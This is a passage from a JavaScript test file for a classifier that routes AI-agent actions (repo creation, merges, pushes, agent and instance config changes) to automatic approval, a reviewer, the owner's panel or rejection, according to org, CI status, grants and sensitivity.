  assert.equal(tierOf(close({ repo: "acme/bor" }, P)), "reject", "outside the agents org");
});

test("create_repo: the panel in the agents org, a plain lowercase name; refused anywhere else", () => {
  const create = (repo) => classify("create_repo", { ...base, repo });
  assert.equal(tierOf(create("acme-agents/expense-tracker")), "panel", "a new app's repo grows the org: authority-expanding");
  for (const repo of ["acme/expense-tracker", "acme-agents/.github", "acme-agents/Apps", "acme-agents/x--y", base.instanceRepo, `acme-agents/${"a".repeat(64)}`]) assert.equal(tierOf(create(repo)), "reject", repo);
  // A reviewer's no on one name holds for that name (requestKey), not for another.
  const no = { action: "create_repo", args: { repo: "acme-agents/zzz-fake" }, state: "rejected", decidedBy: "reviewer:x", decidedAt: "2026-11-14T02:00:00Z" };
  assert.equal(classify("create_repo", { ...base, repo: "acme-agents/zzz-fake", records: [no] }).rule, "rejected-content");
  assert.equal(tierOf(classify("create_repo", { ...base, repo: "acme-agents/expense-tracker", records: [no] })), "panel");
});

test("merge in the agents org", () => {
  assert.equal(tierOf(merge()), 0, "named checks, all green on the exact head: merged at once (owner, 2026-11-12)");
  assert.equal(tierOf(merge({ checks: [] })), "reject", "no checks");
  assert.equal(tierOf(merge({ checks: [{ name: "test", ok: true }, { name: "lint", ok: false }] })), "reject", "a check not green");
  assert.equal(tierOf(merge({ checks: [{ name: "test", ok: false, pending: true }] })), 0, "checks still running: the queue merges only once green on the exact head");
  assert.equal(tierOf(merge({ checks: [{ name: "test", ok: false, pending: false }] })), "reject", "a failed check");
  assert.equal(tierOf(merge({ headMatches: false })), "reject", "head moved");
  assert.equal(tierOf(merge({ ownHead: false })), 1, "a fork's or someone else's head: the reviewer reads the diff");
  assert.equal(tierOf(merge({ ownHead: false, checks: [{ name: "test", ok: false }] })), "reject", "a foreign head with red checks: still the owner's");
  assert.equal(tierOf(merge({ files: [".github/workflows/x.yml"] })), 1, ".github change");
  assert.equal(tierOf(merge({ files: [".github/workflows/ci.yml"], ciTemplate: true })), 0, "an exact copy of the product's CI template (checked in the runner's clone)");
  assert.equal(tierOf(pub("push", { files: [".github/workflows/ci.yml"], ciTemplate: true })), 0, "the same on a push");
  assert.equal(tierOf(pub("push", { repo: "acme/bor", files: [".github/workflows/ci.yml"], ciTemplate: true })), 1, "outside the agents org it is never Tier 0");
  assert.equal(tierOf(merge({ sensitive: true })), 1, "sensitive app");
  assert.equal(tierOf(merge({ repo: "acme/bor", ownHead: false })), "panel", "outside the agents org: the panel");
  assert.equal(tierOf(merge({ repo: "acme/bor", checks: [{ name: "test", ok: false }] })), "reject", "outside, red: friction first");
});

test("apply: agents", () => {
  const trial = def({ name: "Chaser", trial: true, connections: { github: "read" } });
  const grad = def({ name: "Chaser", connections: { github: "read" } });
  assert.equal(tierOf(apply(["agents/chaser/agent.yaml", "agents/chaser/AGENTS.md"], {}, { "agents/chaser/agent.yaml": trial })), 0, "add a trial agent, owner's task");
  assert.equal(tierOf(apply(["agents/chaser/agent.yaml", "agents/chaser/AGENTS.md"], {}, { "agents/chaser/agent.yaml": trial }, { ownerStarted: false })), 1, "add a trial agent, agent-origin task");
  assert.equal(tierOf(apply(["agents/chaser/AGENTS.md"], { "agents/chaser/agent.yaml": trial }, { "agents/chaser/agent.yaml": trial })), 0, "trial handbook only");
  const add = (d) => tierOf(apply(["agents/chaser/agent.yaml", "agents/chaser/AGENTS.md"], {}, { "agents/chaser/agent.yaml": def(d) }));
  assert.equal(add({ name: "Chaser", trial: true, roles: ["architect"] }), "panel", "a new trial agent with a role");
  assert.equal(add({ name: "Chaser", trial: true, image: "x" }), "panel", "a new trial agent with a field outside the safe set");
  assert.equal(add({ name: "Chaser", trial: true, connections: { github: "write" } }), 1, "a new trial agent with a write grant goes to the reviewer");
  assert.equal(tierOf(apply(["agents/chaser/AGENTS.md"], { "agents/chaser/agent.yaml": grad }, { "agents/chaser/agent.yaml": grad })), 1, "handbook of a graduated agent without a role");
  assert.equal(tierOf(apply(["agents/chief-of-staff.md"], {}, {})), 1, "role-holding agent's handbook");
  assert.equal(tierOf(apply(["agents/architect/AGENTS.md"], {}, {})), 1, "a role agent's handbook by the agents/<key>/ path");
  assert.equal(tierOf(apply(["agents/ghost/AGENTS.md"], {}, {})), "reject", "a new handbook without its trial agent.yaml in the change");
  assert.equal(tierOf(apply(["agents/assistant.md"], {}, {})), 1, "module agent without a role");
  assert.equal(tierOf(apply(["agents/assistant/memory.md"], {}, {})), 1, "memory of an agent without a role goes to the reviewer");
  assert.equal(tierOf(apply(["agents/architect/memory.md"], {}, {})), 1, "memory of a role agent is the owner's");
  assert.equal(tierOf(apply(["agents/assistant/memory.md", "agents/assistant/MEMORY.md"], {}, {})), "panel", "an unrecognised file next to it");
  assert.equal(tierOf(apply(["agents/chaser/agent.yaml"], { "agents/chaser/agent.yaml": trial }, { "agents/chaser/agent.yaml": grad })), 1, "graduation keeping its tools");
  const wider = def({ name: "Chaser", connections: { github: "write", slack_live: ["slack_post"] } });
  assert.equal(tierOf(apply(["agents/chaser/agent.yaml"], { "agents/chaser/agent.yaml": trial }, { "agents/chaser/agent.yaml": wider })), "panel", "graduation with new grants");
  assert.equal(tierOf(apply(["agents/chaser/agent.yaml"], { "agents/chaser/agent.yaml": grad }, { "agents/chaser/agent.yaml": def({ name: "Chaser", model: "x", connections: { github: "read" } }) })), 1, "model change");
  assert.equal(tierOf(apply(["agents/chaser/agent.yaml"], { "agents/chaser/agent.yaml": grad }, { "agents/chaser/agent.yaml": def({ name: "Chaser", image: "x", connections: { github: "read" } }) })), "panel", "an unrecognised field");
});

test("apply: instance settings, pin and apps", () => {
  const f = ["instance.yaml"];
  assert.equal(tierOf(apply(f, { "instance.yaml": inst() }, { "instance.yaml": inst().replace("[C1]", "[C1, C2]") })), 1, "slack_post_channels addition");
  assert.equal(tierOf(apply(f, { "instance.yaml": inst({ github_orgs: [] }) }, { "instance.yaml": inst({ github_orgs: ["evil"] }) })), "panel", "github_orgs");
  assert.equal(tierOf(apply(f, { "instance.yaml": inst() }, { "instance.yaml": inst({ autonomy: "full" }) })), "panel", "any other setting");
  assert.equal(tierOf(apply(f, { "instance.yaml": inst() }, { "instance.yaml": inst({ spend_caps: "off" }) })), "panel", "the spend caps' kill switch is the owner's");
  assert.equal(tierOf(apply(f, { "instance.yaml": inst() }, { "instance.yaml": inst().replace(PIN_A, PIN_B) }, { pin: { forward: true } })), 1, "pin forward");
  assert.equal(tierOf(apply(f, { "instance.yaml": inst() }, { "instance.yaml": inst({}, "overrides:\n  routines:\n    daily-brief:\n      schedules: []\n") })), 1, "routine schedule");
  assert.equal(tierOf(apply(f, { "instance.yaml": inst() }, { "instance.yaml": inst({}, "overrides:\n  agents:\n    assistant:\n      model: x\n") })), 1, "model change");
  assert.equal(tierOf(apply(f, { "instance.yaml": inst() }, { "instance.yaml": inst({}, "overrides:\n  agents:\n    assistant:\n      caps: { task_usd: 50 }\n") })), "panel", "an agent's spend caps are the owner's");
  const graded = (g) => def({ name: "Chaser", connections: { github: "read" }, ...g });
  assert.equal(tierOf(apply(["agents/chaser/agent.yaml"], { "agents/chaser/agent.yaml": graded({}) }, { "agents/chaser/agent.yaml": graded({ graded: false }) })), "panel", "turning grading off is the owner's");
  const apps = (a) => `apps:\n${a.map((x) => `  - ${JSON.stringify(x)}`).join("\n")}\n`;
  const app = { name: "roadmap", repo: "acme-agents/roadmap", owner: "a", description: "d" };
  assert.equal(tierOf(apply(["apps.yaml"], { "apps.yaml": apps([]) }, { "apps.yaml": apps([app]) })), 1, "non-sensitive app");
  assert.equal(tierOf(apply(["apps.yaml"], { "apps.yaml": apps([]) }, { "apps.yaml": apps([{ ...app, database: "warehouse" }]) })), 1, "warehouse database");
  assert.equal(tierOf(apply(["apps.yaml"], { "apps.yaml": apps([]) }, { "apps.yaml": apps([{ ...app, connects: ["paperclip"] }]) })), "panel", "connects to paperclip");
  assert.equal(tierOf(apply(["apps.yaml"], { "apps.yaml": apps([]) }, { "apps.yaml": apps([{ ...app, access: { roles: ["x"] } }]) })), "panel", "access");
  assert.equal(tierOf(apply(["apps.yaml"], { "apps.yaml": apps([]) }, { "apps.yaml": apps([{ ...app, caps: ["NET_ADMIN"] }]) })), "panel", "caps");
  const shared = { name: "dash", share: { host: "dash.example.com", aud: "x", viewers: ["a@x.com"] } };
  assert.equal(tierOf(apply(["apps.yaml"], { "apps.yaml": apps([]) }, { "apps.yaml": apps([{ ...app, share: shared.share }]) })), "panel", "share: a wider human audience is the owner's");
  assert.equal(tierOf(apply(["apps.yaml"], { "apps.yaml": apps([{ ...app, name: "dash", share: shared.share }]) }, { "apps.yaml": apps([{ ...app, name: "dash", share: shared.share }, { ...app, connects: ["dash"] }]) })), "panel", "connects to a shared app");
  // apps-mcp's isSensitive decides; only `database: warehouse` alone is carved out to Tier 1.
  assert.equal(tierOf(apply(["apps.yaml"], { "apps.yaml": apps([]) }, { "apps.yaml": apps([{ ...app, stateful: true }]) })), "panel", "stateful is sensitive");
  assert.equal(tierOf(apply(["apps.yaml"], { "apps.yaml": apps([]) }, { "apps.yaml": apps([{ ...app, database: "warehouse", stateful: true }]) })), "panel", "warehouse plus another trait");
  assert.equal(tierOf(apply(["apps.yaml"], { "apps.yaml": apps([]) }, { "apps.yaml": apps([{ ...app, connects: ["vault"] }]) }, { moduleApps: [{ name: "vault", access: { roles: ["x"] } }] })), "panel", "connects to a restricted module app");
  assert.equal(tierOf(apply(["apps.yaml", "instance.yaml"], { "apps.yaml": apps([]), "instance.yaml": inst() }, { "apps.yaml": apps([app]), "instance.yaml": inst({ github_orgs: ["x"] }) })), "panel", "mixed: the highest part");
  assert.equal(tierOf(apply(["README.md"], {}, {})), "panel", "unrecognised");
});

test("the four real rejects of 2026-11-10/11 never reach the reviewer as approvable", () => {
  // An app PR into the product repo, from an app-building agent.
  assert.equal(tierOf(pub("pr", { repo: base.productRepo, files: ["modules/core/apps/x/index.ts"] })), "reject");
  // A product pin moving backwards.
  assert.equal(tierOf(apply(["instance.yaml"], { "instance.yaml": inst() }, { "instance.yaml": inst().replace(PIN_A, PIN_B) }, { pin: { back: true } })), "panel");
  // Two leftover cards on cancelled tasks.
  assert.equal(tierOf(pub("push", {}, { taskStatus: "cancelled" })), "reject");
  assert.equal(tierOf(merge({}, { taskStatus: "cancelled" })), "reject");
});
